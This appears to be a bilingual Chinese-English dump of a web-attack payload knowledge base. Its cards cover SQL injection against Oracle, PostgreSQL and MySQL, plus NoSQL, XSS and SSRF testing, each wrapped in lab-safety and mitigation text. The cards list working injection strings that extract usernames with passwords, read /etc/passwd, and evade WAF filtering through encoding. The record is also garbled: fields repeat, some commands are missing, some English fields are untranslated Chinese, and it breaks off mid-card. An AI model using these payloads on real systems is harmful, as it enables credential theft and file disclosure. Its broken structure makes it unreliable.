exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

name.zh: Oracle UNION 枚举语义

description.zh: 将原混合条目中属于Oracle UNION 枚举语义的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle UNION Enumeration Semantics into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认Oracle UNION 枚举语义所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle UNION Enumeration Semantics in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: Oracle UNION 枚举语义主验证命令
title.en: Oracle UNION Enumeration Semantics Primary Validation

execution.command:
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL--
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

analysis.zh: Oracle UNION 枚举语义的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle UNION Enumeration Semantics evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

overview.zh: PostgreSQL UNION 与目录枚举必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: PostgreSQL UNION and Catalog Enumeration must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达PostgreSQL UNION 与目录枚举对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the PostgreSQL UNION and Catalog Enumeration statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

title.zh: PostgreSQL 服务端文件读取边界主验证命令
title.en: PostgreSQL Server-File Read Boundary Primary Validation

execution.command:
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

analysis.zh: PostgreSQL 服务端文件读取边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive PostgreSQL Server-File Read Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

analysis.zh: 阳性证据是客户端操作符保留到最终 filter 并替代预期等值条件，导致未授权合成账户登录、marker 返回或可重复的合成前缀 oracle。 假阳性边界：JSON 接受对象、CastError/BadValue、响应状态变化、正则超时、$where 被禁用、查询仍包含固定等值条件或已有测试会话均不是绕过。

overview.zh: 验证标量凭据是否被客户端对象替换为 $ne、$gt、$regex、$where 等查询语义，并区分顶层逻辑操作符与字段操作符。 本教程把“能被输入触达”“数据库实际解释”和“形成可复验证据”分开审查。API 接受 JSON/BSON 对象并直接构造 MongoDB filter，schema validation、driver 版本和 $where/JavaScript 配置已确认。隔离集合只有合成账户与 marker，command/query profiler 可记录最终 filter、匹配文档和会话签发。
overview.en: Tests whether scalar credentials can be replaced by client objects using $ne, $gt, $regex, or $where semantics and distinguishes top-level logical operators from field operators. This tutorial reviews input reachability, actual database interpretation, and reproducible evidence as separate claims. The API accepts JSON or BSON objects and builds MongoDB filters directly, with schema validation, driver version, and $where or Java Script settings confirmed. An isolated collection contains synthetic accounts and markers only, while command or query profiling records the final filter, matched documents, and session issuance.

vulnerability.zh: 阳性证据是客户端操作符保留到最终 filter 并替代预期等值条件，导致未授权合成账户登录、marker 返回或可重复的合成前缀 oracle。 核心判断是受控输入是否越过预期的数据绑定或查询构造边界，并由同一请求的应用与数据库证据相互印证。JSON 接受对象、CastError/BadValue、响应状态变化、正则超时、$where 被禁用、查询仍包含固定等值条件或已有测试会话均不是绕过。
vulnerability.en: Positive evidence requires client operators to survive into the final filter and replace expected equality, causing unauthorized synthetic-account login, marker return, or a repeatable synthetic-prefix oracle. The core decision is whether controlled input crosses the intended data-binding or query-construction boundary, corroborated by application and database evidence for the same request. JSON object acceptance, Cast Error or Bad Value, status changes, regex timeout, disabled $where, a query retaining fixed equality, or an existing test session does not prove bypass.

exploitation.zh: 比较字符串错误凭据与单一操作符对象，保存最终 BSON filter；只在合成字段做短前缀正则，不执行 $where JavaScript。 条目中的源命令仅作为逐字节审校与路由证据保留；标记为需覆盖的行在得到安全替代、隔离环境和明确授权前不执行，也不从本教程推导新的攻击命令。
exploitation.en: Compare an invalid string credential with one operator object and preserve the final BSON filter; use short-prefix regex only on synthetic fields and do not execute $where Java Script. The source command is retained only as byte-exact editorial and routing evidence. Any line flagged for override remains unexecuted until a safe substitute, an isolated environment, and explicit authorization are in place; this tutorial derives no new attack command.

mitigation.zh: 用 JSON Schema/DTO 强制标量类型，服务端构造固定 filter 并拒绝所有未允许的 $ 操作符，认证采用专用常量时间比较。 修复验收必须在相同入口重放正常业务输入、阳性对照和阴性对照，核对最终语句、绑定参数、权限与副作用均回到预期边界，并确认清理完成。

' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

description.zh: 其他报错注入方法
description.en: Other error-based injection methods

analysis.zh: 阳性证据是可控子查询结果进入数据库生成的错误文本并以同一请求返回 marker，且错误函数在目标版本确实执行。 假阳性边界：普通语法错误、函数不存在、错误页固定模板、路径/函数名回显、应用自行拼接 marker、NTILE 正常窗口结果或其他版本 PoC 都不是报错数据回显。
analysis.en: Positive evidence requires the controlled subquery result to enter database-generated error text and return the marker in the same request, with the error function executing on the target version. False-positive boundary: Ordinary syntax errors, missing functions, fixed error pages, reflected paths or function names, application-added markers, a normal NTILE window result, or proof on another version does not establish error-based reflection.

opsecTips.zh: 报错注入仅触发少量 marker 错误；出现日志洪泛、监控告警、真实数据、CPU/内存异常、事务回滚或服务降级时停止。
opsecTips.en: Error-based testing triggers a small number of marker errors only; stop on log flooding, monitoring alerts, real data, CPU or memory anomalies, transaction rollback, or service degradation.

opsecTips.zh: 删除合成表/marker 和错误响应副本，清理应用/数据库错误日志与告警队列，恢复参数化和统一错误处理。
opsecTips.en: Delete synthetic tables, markers, and error-response copies, clear application and database error logs plus alert queues, and restore parameterization and normalized errors.

title.zh: 替代报错函数绕过

' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--

description.zh: 使用GEOMETRYCOLLECTION空间函数、JSON_KEYS、ST_LatFromGeoHash等冷门函数替代extractvalue/updatexml触发报错
description.en: Use obscure functions such as GEOMETRYCOLLECTION spatial functions, JSON_KEYS, and ST_Lat From Geo Hash as alternatives to extractvalue/updatexml to trigger error-based extraction

explanation.en: Column count detection via ORDER BY

title.zh: 编码与科学计数法绕过

wafBypass.command:
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.schemata GROUP BY x)a)--
' %26%26 updatexml(1,concat(0x7e,(select%20database())),1)--%20

description.zh: 使用unhex(hex())双层编码、EXP()科学计数法溢出、URL双重编码（%26%26替代AND）绕过WAF检测
description.en: Use unhex(hex()) double encoding, EXP() scientific notation overflow, and URL double encoding (%26%26 to replace AND) to bypass WAF detection

overview.zh: 覆盖 MySQL 5.7 XML 函数、重复键/RAND、数学、GIS 与 JSON 错误路径；许多函数已在 MySQL 8.x 移除或不稳定回显数据。 本教程把“能被输入触达”“数据库实际解释”和“形成可复验证据”分开审查。已确认 MySQL/MariaDB 精确版本、SQL mode、错误是否返回客户端，以及 extractvalue/updatexml/GIS/JSON 函数实际存在。只用固定 marker 字符串和合成表，保存数据库 error code/message、应用包装后的错误、最终 SQL 与请求 ID。
overview.en: Covers MySQL 5.7 XML functions, duplicate-key or RAND, mathematical, GIS, and JSON error paths, many of which were removed in MySQL 8.x or do not reliably reflect data. This tutorial reviews input reachability, actual database interpretation, and reproducible evidence as separate claims. The exact MySQL or Maria DB version, SQL mode, client error visibility, and availability of extractvalue, updatexml, GIS, and JSON functions are confirmed. Only fixed marker strings and a synthetic table are used, preserving database error code and message, application-wrapped error, final SQL, and request identifier.

vulnerability.zh: 阳性证据是可控子查询结果进入数据库生成的错误文本并以同一请求返回 marker，且错误函数在目标版本确实执行。 核心判断是受控输入是否越过预期的数据绑定或查询构造边界，并由同一请求的应用与数据库证据相互印证。普通语法错误、函数不存在、错误页固定模板、路径/函数名回显、应用自行拼接 marker、NTILE 正常窗口结果或其他版本 PoC 都不是报错数据回显。
vulnerability.en: Positive evidence requires the controlled subquery result to enter database-generated error text and return the marker in the same request, with the error function executing on the target version. The core decision is whether controlled input crosses the intended data-binding or query-construction boundary, corroborated by application and database evidence for the same request. Ordinary syntax errors, missing functions, fixed error pages, reflected paths or function names, application-added markers, a normal NTILE window result, or proof on another version does not establish error-based reflection.

exploitation.zh: 先用常量 marker 验证目标版本可回显，再对合成表一行做最小子查询；每个函数族独立测试并记录弃用/移除状态。 条目中的源命令仅作为逐字节审校与路由证据保留；标记为需覆盖的行在得到安全替代、隔离环境和明确授权前不执行，也不从本教程推导新的攻击命令。
exploitation.en: First verify marker reflection for the target version, then use one minimal subquery against a synthetic row; test each function family independently and record deprecation or removal state. The source command is retained only as byte-exact editorial and routing evidence. Any line flagged for override remains unexecuted until a safe substitute, an isolated environment, and explicit authorization are in place; this tutorial derives no new attack command.

mitigation.zh: 参数化查询、生产关闭详细数据库错误、统一异常映射，应用账户限制 information_schema/业务敏感列并升级移除旧危险路径。 修复验收必须在相同入口重放正常业务输入、阳性对照和阴性对照，核对最终语句、绑定参数、权限与副作用均回到预期边界，并确认清理完成。
mitigation.en: Parameterize queries, suppress detailed database errors in production, normalize exception mapping, limit information_schema and sensitive-column access, and upgrade away from legacy error paths. Acceptance testing replays normal business input plus positive and negative controls at the same entry point, verifies final statements, bindings, privileges, and side effects return to the intended boundary, and confirms cleanup is complete.

overview.zh: 验证首次写入时作为数据保存的值，是否在登录、密码修改、重置、评论后台等后续路径被当作可信 SQL 重新拼接。 本教程把“能被输入触达”“数据库实际解释”和“形成可复验证据”分开审查。已定位首次参数化写入与后续动态 SQL sink 的两个独立代码路径，能用唯一 token 关联存储记录、任务/会话和最终 SQL。隔离事务只使用合成用户/评论和 marker 行，后续动作只读或可回滚，不触发真实密码重置、管理员数据或通知。
overview.en: Tests whether a value stored as data during an initial write is later treated as trusted SQL and concatenated in login, password change, reset, or administrative-comment flows. This tutorial reviews input reachability, actual database interpretation, and reproducible evidence as separate claims. The initial parameterized write and later dynamic-SQL sink are located as separate code paths, with a unique token correlating stored record, job or session, and final SQL. An isolated transaction uses synthetic users or comments and marker rows only, with later actions read-only or reversible and no real password reset, administrator data, or notification.

vulnerability.zh: 阳性证据是同一存储 token 在后续路径脱离绑定参数、改变最终 SQL AST 并访问/影响专用 marker；首次写入与二次执行连续。 核心判断是受控输入是否越过预期的数据绑定或查询构造边界，并由同一请求的应用与数据库证据相互印证。首次保存成功、立即请求可注入、后续普通错误、字符串出现在日志、手工复制到 SQL 控制台、全角引号未标准化或 CONCAT 文本仍作为用户名均不是二阶执行。
vulnerability.en: Positive evidence requires the same stored token to leave parameter binding in a later path, alter the final SQL AST, and access or affect a dedicated marker, continuously linking initial write and second execution. The core decision is whether controlled input crosses the intended data-binding or query-construction boundary, corroborated by application and database evidence for the same request. Successful storage, immediate injection, a later ordinary error, strings in logs, manual SQL-console copying, unnormalized full-width quotes, or literal CONCAT text remaining a username does not prove second-order execution.

exploitation.zh: 用短 token 写入合成记录，完成真实后续业务动作并捕获最终 SQL；只验证 marker 选择/条件变化，不运行源凭据提取、重置或管理员评论命令。 条目中的源命令仅作为逐字节审校与路由证据保留；标记为需覆盖的行在得到安全替代、隔离环境和明确授权前不执行，也不从本教程推导新的攻击命令。
exploitation.en: Store a short token in a synthetic record, execute the real later business action, and capture final SQL; validate marker selection or predicate change only and do not run source credential extraction, reset, or administrator-comment commands. The source command is retained only as byte-exact editorial and routing evidence. Any line flagged for override remains unexecuted until a safe substitute, an isolated environment, and explicit authorization are in place; this tutorial derives no new attack command.

mitigation.zh: 所有后续查询仍使用绑定参数，存储值不得成为 SQL 片段；动态标识符映射固定值，并对跨任务/后台流程做同等代码审计。 修复验收必须在相同入口重放正常业务输入、阳性对照和阴性对照，核对最终语句、绑定参数、权限与副作用均回到预期边界，并确认清理完成。
mitigation.en: Keep every later query parameterized and never treat stored values as SQL fragments, map dynamic identifiers to fixed values, and audit background and cross-job flows equally. Acceptance testing replays normal business input plus positive and negative controls at the same entry point, verifies final statements, bindings, privileges, and side effects return to the intended boundary, and confirms cleanup is complete.

description.zh: 恢复参数化、严格分帧和最小权限，删除测试 marker 与临时状态，再重放阴性及正常业务基线。
description.en: Restore parameterization, strict framing, and least privilege, remove test markers and temporary state, then replay negative and normal business baselines.

overview.zh: SQL Marker HTTP Chunked 载体从原集合中独立出来，因为其成立条件依赖特定语句语义、DBMS 或传输解析链。来源行保持守恒，但只能在隔离环境验证。
overview.en: SQL Marker HTTP Chunked Carrier is isolated because its validity depends on specific statement semantics, a DBMS, or a transport parser chain. Source lines remain conserved but may be validated only in an isolated environment.

vulnerability.zh: 风险成立需要输入在SQL Marker HTTP Chunked 载体路径中越过预期绑定、解析或授权边界，并由同一请求的后端证据确认。HTTP 200、延迟、关键字回显或语法错误本身均不足。
vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the SQL Marker HTTP Chunked Carrier path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

name.zh: MySQL 堆叠语句边界

description.en: Routes every source line belonging to MySQL Stacked-Statement Boundary into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

prerequisites.zh: 仅在隔离实例确认MySQL 堆叠语句边界所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by MySQL Stacked-Statement Boundary in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

title.zh: MySQL 堆叠语句边界主验证命令

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

analysis.zh: MySQL 堆叠语句边界的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for MySQL Stacked-Statement Boundary requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the PostgreSQL Stacked-Statement Boundary path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

description.en: Routes every source line belonging to Transaction-Rolled-Back Marker DML into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

prerequisites.zh: 仅在隔离实例确认事务回滚 Marker DML所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by Transaction-Rolled-Back Marker DML in an isolated instance and do not infer results across technique branches.

prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

analysis.zh: 事务回滚 Marker DML的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for Transaction-Rolled-Back Marker DML requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

overview.zh: 反射型 XSS 输出边界聚焦以下边界：验证请求参数是否未经上下文编码进入当前响应的可执行 HTML、属性或脚本位置。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: Reflected XSS Output Boundary focuses on this boundary: Tests whether a request parameter reaches executable HTML, attribute, or script context in the current response without contextual encoding. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信输入在输出时进入与其编码方式不匹配的浏览器上下文，或在 DOM 中流入可执行汇。黑名单、CSP、WAF 和字符串替换都不能替代按 HTML、属性、URL、CSS 或 JavaScript 上下文执行编码与净化。
vulnerability.en: Risk arises when untrusted input reaches a browser context whose output encoding does not match that context, or flows into an executable DOM sink. Blacklists, CSP, WA Fs, and string replacement do not replace HTML, attribute, URL, CSS, or Java Script contextual encoding and sanitization.

exploitation.zh: 在隔离页面中先渲染普通文本基线，再提交只设置 window 本地布尔标记的样例。阳性必须由最终 DOM、实际事件执行和浏览器控制台共同确认，并排除字符串回显、查看源代码、CSP 报告模式和浏览器扩展影响。
exploitation.en: Render a plain-text baseline in an isolated page, then submit a sample that only sets a local Boolean marker on window. Confirm a positive result with the final DOM, actual event execution, and browser console, excluding string reflection, view-source output, report-only CSP, and browser-extension effects.

mitigation.zh: 按最终输出上下文使用框架编码器，对允许富文本使用维护中的 HTML sanitizer，禁止不可信值进入危险 DOM 汇，并将 CSP 作为纵深防护。Cookie 使用 HttpOnly、Secure 与合适 SameSite，修复后重放文本、标记和阴性编码对照。
mitigation.en: Use framework encoders for the final output context, a maintained HTML sanitizer for permitted rich text, and prevent untrusted values from reaching dangerous DOM sinks, with CSP as defense in depth. Set HttpOnly, Secure, and appropriate SameSite on cookies, then replay text, marker, and negative encoding controls.

overview.zh: 存储型 XSS 持久化边界聚焦以下边界：验证无害标记是否被持久化，并在不同查看者页面进入可执行浏览器上下文。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: Stored XSS Persistence Boundary focuses on this boundary: Tests whether a harmless marker is persisted and later enters an executable browser context for another viewer. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信输入在输出时进入与其编码方式不匹配的浏览器上下文，或在 DOM 中流入可执行汇。黑名单、CSP、WAF 和字符串替换都不能替代按 HTML、属性、URL、CSS 或 JavaScript 上下文执行编码与净化。
vulnerability.en: Risk arises when untrusted input reaches a browser context whose output encoding does not match that context, or flows into an executable DOM sink. Blacklists, CSP, WA Fs, and string replacement do not replace HTML, attribute, URL, CSS, or Java Script contextual encoding and sanitization.

exploitation.zh: 在隔离页面中先渲染普通文本基线，再提交只设置 window 本地布尔标记的样例。阳性必须由最终 DOM、实际事件执行和浏览器控制台共同确认，并排除字符串回显、查看源代码、CSP 报告模式和浏览器扩展影响。
exploitation.en: Render a plain-text baseline in an isolated page, then submit a sample that only sets a local Boolean marker on window. Confirm a positive result with the final DOM, actual event execution, and browser console, excluding string reflection, view-source output, report-only CSP, and browser-extension effects.

mitigation.zh: 按最终输出上下文使用框架编码器，对允许富文本使用维护中的 HTML sanitizer，禁止不可信值进入危险 DOM 汇，并将 CSP 作为纵深防护。Cookie 使用 HttpOnly、Secure 与合适 SameSite，修复后重放文本、标记和阴性编码对照。
mitigation.en: Use framework encoders for the final output context, a maintained HTML sanitizer for permitted rich text, and prevent untrusted values from reaching dangerous DOM sinks, with CSP as defense in depth. Set HttpOnly, Secure, and appropriate SameSite on cookies, then replay text, marker, and negative encoding controls.

overview.zh: CSP 回归与脚本来源审计聚焦以下边界：核对 CSP 是否限制脚本来源、内联执行、动态求值、base-uri 与对象加载，并区分策略缺口和 XSS 根因。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: CSP Regression and Script-Source Audit focuses on this boundary: Reviews whether CSP constrains script sources, inline execution, dynamic evaluation, base-uri, and object loading while separating policy gaps from the underlying XSS flaw. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信输入在输出时进入与其编码方式不匹配的浏览器上下文，或在 DOM 中流入可执行汇。黑名单、CSP、WAF 和字符串替换都不能替代按 HTML、属性、URL、CSS 或 JavaScript 上下文执行编码与净化。
vulnerability.en: Risk arises when untrusted input reaches a browser context whose output encoding does not match that context, or flows into an executable DOM sink. Blacklists, CSP, WA Fs, and string replacement do not replace HTML, attribute, URL, CSS, or Java Script contextual encoding and sanitization.

exploitation.zh: 在隔离页面中先渲染普通文本基线，再提交只设置 window 本地布尔标记的样例。阳性必须由最终 DOM、实际事件执行和浏览器控制台共同确认，并排除字符串回显、查看源代码、CSP 报告模式和浏览器扩展影响。
exploitation.en: Render a plain-text baseline in an isolated page, then submit a sample that only sets a local Boolean marker on window. Confirm a positive result with the final DOM, actual event execution, and browser console, excluding string reflection, view-source output, report-only CSP, and browser-extension effects.

mitigation.zh: 按最终输出上下文使用框架编码器，对允许富文本使用维护中的 HTML sanitizer，禁止不可信值进入危险 DOM 汇，并将 CSP 作为纵深防护。Cookie 使用 HttpOnly、Secure 与合适 SameSite，修复后重放文本、标记和阴性编码对照。
mitigation.en: Use framework encoders for the final output context, a maintained HTML sanitizer for permitted rich text, and prevent untrusted values from reaching dangerous DOM sinks, with CSP as defense in depth. Set HttpOnly, Secure, and appropriate SameSite on cookies, then replay text, marker, and negative encoding controls.

overview.zh: SSRF 最终连接目标验证聚焦以下边界：确认服务端取回器是否允许用户输入改变解析地址、最终连接 IP、端口或重定向目标。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: SSRF 最终连接目标验证聚焦以下边界：确认服务端取回器是否允许用户输入改变解析地址、最终连接 IP、端口或重定向目标。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。
vulnerability.en: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。

exploitation.zh: 先请求自有 HTTPS 标记服务记录取回器身份、DNS、最终 IP、请求头、重定向和响应传播，再只对隔离内部夹具运行一个唯一标记。阳性需要夹具日志与应用出站日志同时出现相同标记；超时、状态码或 URL 被接受均不足。
